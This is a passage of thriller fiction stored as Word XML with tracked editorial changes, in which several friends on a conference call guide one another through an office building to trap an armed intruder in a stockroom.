          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> screamed Jason into the hands-free conference call in progress on his cellphone. A bullet glanced off of the rear driver’s side window, leaving a scar in the glass, just as Jason cleared the parking lot. The car lurched as he made a sharp turn onto the street, bolting away from the building.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Having lost Jason’s SUV, the man turned toward the Tungsten entrance. He thrust his hip toward the card-reader. The green light popped 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“He’s heading in,” </w:t>
      </w:r>
      <w:ins w:id="1033" w:author="TextVet" w:date="2016-03-17T09:27:00Z">
        <w:r w:rsidR="00DC3E9D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>warne</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1034" w:author="TextVet" w:date="2016-03-17T09:27:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00DC3E9D">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 Moshen on the conference call.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crouched behind the corner of the Tungsten building, out of sight from the entrance. Beside him, his contraption whined faintly with a rising high-pitched tone, its tiny lights glowing red. “Mike, he’s coming for you,” Danny </w:t>
      </w:r>
      <w:ins w:id="1035" w:author="TextVet" w:date="2016-03-17T09:32:00Z">
        <w:r w:rsidR="00EA7F68">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>cautioned</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1036" w:author="TextVet" w:date="2016-03-17T09:32:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00EA7F68">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>sa</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="1037" w:author="TextVet" w:date="2016-03-17T09:31:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00EA7F68">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>id into</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> his cellphone. “Make sure he follows you to the stockroom. Moshen, keep him safe.”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“Aye aye,” said Moshen. “Mike, I’ve got the guy on camera. He’s in a hallway about fifty feet behind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Mike’s voice asked, “How do I get to the stockroom from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“End of the hall,” Moshen directed. “Make a left…”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conference call, Danny heard Mike running through Tungsten’s hallways. Moshen guided him, always keeping him one turn ahead of his pursuer. A distant </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>pop-clack!</w:t>
      </w:r>
      <w:ins w:id="1038" w:author="TextVet" w:date="2016-03-17T09:32:00Z">
        <w:r w:rsidR="004F670F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:i/>
            <w:iCs/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>occasionally punctuated the dialog.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“Now</w:t>
      </w:r>
      <w:ins w:id="1039" w:author="TextVet" w:date="2016-03-17T09:32:00Z">
        <w:r w:rsidR="00A3044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Mike, remember,” said Danny. “There’s a keycard scanner on the outside of the door to the stockroom. So once you get into the stockroom, you can’t get back into the Tungsten offices without a keycard. The only way out of that stockroom is through the fire door near the loading dock.”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added, “He’s walking slowly down the hall toward you with his gun drawn. Stay out of sight, Mike.”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conference call carried the sound of a door opening. “I’m in the stockroom,” said Mike.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caught himself biting his fingernails. “Jason. Come back here and get to the loading dock. Quickly. Where are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“Down the street,” </w:t>
      </w:r>
      <w:del w:id="1040" w:author="TextVet" w:date="2016-03-17T09:33:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008B1182">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Jason’s voice</w:t>
      </w:r>
      <w:ins w:id="1041" w:author="TextVet" w:date="2016-03-17T09:33:00Z">
        <w:r w:rsidR="008B1182">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> declared</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. “There’</w:t>
      </w:r>
      <w:ins w:id="1042" w:author="TextVet" w:date="2016-03-17T09:33:00Z">
        <w:r w:rsidR="00883D33">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>re</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1043" w:author="TextVet" w:date="2016-03-17T09:33:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00883D33">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>s</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> bullet holes in my car. The repairs are coming out of your pay.”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w:t>
      </w:r>
      <w:del w:id="1044" w:author="TextVet" w:date="2016-03-17T09:34:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00B401F8">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Moshen</w:t>
      </w:r>
      <w:ins w:id="1045" w:author="TextVet" w:date="2016-03-17T09:34:00Z">
        <w:r w:rsidR="00B401F8">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> urged</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. “He’s at the stockroom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saw headlights on the road beyond the parking lot. Jason’s SUV proceeded back towards the Tungsten building. “Jason’s not in position yet,” Danny </w:t>
      </w:r>
      <w:ins w:id="1046" w:author="TextVet" w:date="2016-03-17T09:34:00Z">
        <w:r w:rsidR="00F23EA1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>told</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1047" w:author="TextVet" w:date="2016-03-17T09:34:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00F23EA1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>said into</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the cellphone. “Mike, can you keep the guy busy?”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heard Mike grunting and straining. The sound was followed by a few popping, clacking shots from the handgun.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“Holy shit!” yelled Danny. “Mike</w:t>
      </w:r>
      <w:ins w:id="1048" w:author="TextVet" w:date="2016-03-17T09:36:00Z">
        <w:r w:rsidR="00D511D4">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r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="1049" w:author="TextVet" w:date="2016-03-17T09:35:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>Mike</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, are you alright? What’s happening?”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Moshen’s voice came across the call. “He looks fine. He tried to push over one of the shelves of inventory. The guy busted in on him and opened fire, but he managed to duck behind some old junk. He’s hiding behind an X-ray machine or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“What’s the guy doing?”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Moshen answered, “He’s crouched and ready, both hands on his gun, about thirty feet </w:t>
      </w:r>
      <w:del w:id="1050" w:author="TextVet" w:date="2016-03-17T09:36:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="009B5F72">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">away </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>from Mike</w:t>
      </w:r>
      <w:ins w:id="1051" w:author="TextVet" w:date="2016-03-17T09:37:00Z">
        <w:r w:rsidR="00F60049">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>—</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1052" w:author="TextVet" w:date="2016-03-17T09:37:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00F60049">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">. It </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>looks like he doesn’t know where Mike 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cursed under his breath. “Guys, I’m going in. Moshen, the front door, please.”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green light popped on above the card reader. Danny entered the building and hustled down the corridors, keeping his cellphone to his ear while carrying his contraption. Moshen’s voice guided him through the dark, unfamiliar office hallways, past strange apparatuses and doors marked with ominous warnings and hazard symbols.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Jason’s voice came across the air. “I’m in position,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said, “Mike’s pinned down. If he moves, he’ll get shot.”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arrived at the hallway outside the stockroom. Before him was a metal door. It bore a small glass window, no bigger than a person’s face. The stockroom’s emergency lights made the square of glass emit a faint</w:t>
      </w:r>
      <w:ins w:id="1053" w:author="TextVet" w:date="2016-03-17T09:38:00Z">
        <w:r w:rsidR="00F51325">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sickly yellow shine at the end of the dim hallway. On the wall</w:t>
      </w:r>
      <w:ins w:id="1054" w:author="TextVet" w:date="2016-03-17T09:38:00Z">
        <w:r w:rsidR="006539A1">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ins w:id="1055" w:author="TextVet" w:date="2016-03-17T09:40:00Z">
        <w:r w:rsidR="006539A1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">like the eye of a predator, </w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1056" w:author="TextVet" w:date="2016-03-17T09:38:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="006539A1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">was </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">a glowing green button </w:t>
      </w:r>
      <w:ins w:id="1057" w:author="TextVet" w:date="2016-03-17T14:19:00Z">
        <w:r w:rsidR="0060534C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>marked</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="1058" w:author="TextVet" w:date="2016-03-17T09:40:00Z">
        <w:r w:rsidR="006539A1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> the</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="1059" w:author="TextVet" w:date="2016-03-17T09:39:00Z">
        <w:r w:rsidR="006539A1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> end of</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1060" w:author="TextVet" w:date="2016-03-17T09:39:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="006539A1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>attached to</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> a thin electrical conduit that ran </w:t>
      </w:r>
      <w:del w:id="1061" w:author="TextVet" w:date="2016-03-17T14:20:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00B75F61">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">up </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>to the ceiling</w:t>
      </w:r>
      <w:ins w:id="1062" w:author="TextVet" w:date="2016-03-17T09:39:00Z">
        <w:r w:rsidR="009F5477">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">. </w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1063" w:author="TextVet" w:date="2016-03-17T14:18:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="009F5477">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The conduit split off and connected to a block that pressed up against a silvery rectangle at the top of the door — the armature plate of a standard magnetic lock system.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whispered into the call, “Moshen. You said he’s about thirty feet away from me toward the entrance,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said Moshen.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I’m right outside,” Danny said into the cellphone. “What are you doing?”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gonna throw this thing at him,” Mike said quietly.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“What thing?”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“I’m not sure,” said Mike. “It looks kind of like an old computer, but it’s all round and purple and </w:t>
      </w:r>
      <w:del w:id="1064" w:author="TextVet" w:date="2016-03-17T14:21:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008171DF">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">it </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>says ‘SGI O2+’ on the front.”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commentRangeStart w:id="1065"/>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>“Dude!” said Danny. “In the late ‘90s, that thing used to be the most popular 3D rendering workstation on the consumer market!”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well,” said Mike, “let’s see if it makes a good projectile weapon.”</w:t>
      </w:r>
    </w:p>
    <w:commentRangeEnd w:id="1065"/>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000841A8" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="1065"/>
      </w:r>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Danny heard Mike give a mighty grunt, followed by a crashing noise and the “</w:t>
      </w:r>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>pop-clack!</w:t>
      </w:r>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>” of the semiautomatic. On the far side of the stockroom, Mike body-checked his way through the emergency exit.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Jason’s voice announced, “Mike, you’re okay!”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="00566952" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="1066" w:author="TextVet" w:date="2016-03-17T14:28:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>“Punch it!”</w:t>
      </w:r>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> yelled Mike.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thud sounded through the cellphone as Jason backed his SUV up against the fire exit. Jason had positioned his car about three feet </w:t>
      </w:r>
      <w:ins w:id="1067" w:author="TextVet" w:date="2016-03-17T14:29:00Z">
        <w:r w:rsidR="00BC5C7D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>from</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1068" w:author="TextVet" w:date="2016-03-17T14:29:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00BC5C7D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>away</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> outside the door, </w:t>
      </w:r>
      <w:del w:id="1069" w:author="TextVet" w:date="2016-03-17T14:29:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00120C78">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">and had been </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>waiting to see Mike run out. The moment Mike cleared the exit, Jason slammed the back of his car against it. The fire door opened outward, so the SUV served as an enormous doorstop.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“Good job, Mike,” said Danny. “Now go around the outside of the building, get back in through the front doors, and come back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inside the stockroom, Danny could hear the man throwing himself against the fire exit in a useless attempt to push away the SUV. The “</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>pop-clack!</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>” of the gun sounded a few times, then silence.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waited tensely in the dim hallway outside the stockroom door. “Is he coming back this way yet?” he asked. “As soon as he realizes the fire exit’s blocked, he’s going to try </w:t>
      </w:r>
      <w:del w:id="1070" w:author="TextVet" w:date="2016-03-17T14:32:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00F22C1B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">to </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>get</w:t>
      </w:r>
      <w:ins w:id="1071" w:author="TextVet" w:date="2016-03-17T14:32:00Z">
        <w:r w:rsidR="00F22C1B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ting</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> out the way he came. But he’ll need to use his keycard to open the door from that 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“Not yet,” </w:t>
      </w:r>
      <w:del w:id="1072" w:author="TextVet" w:date="2016-03-17T14:33:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00E368D5">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w:t>
      </w:r>
      <w:ins w:id="1073" w:author="TextVet" w:date="2016-03-17T14:33:00Z">
        <w:r w:rsidR="00E368D5">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
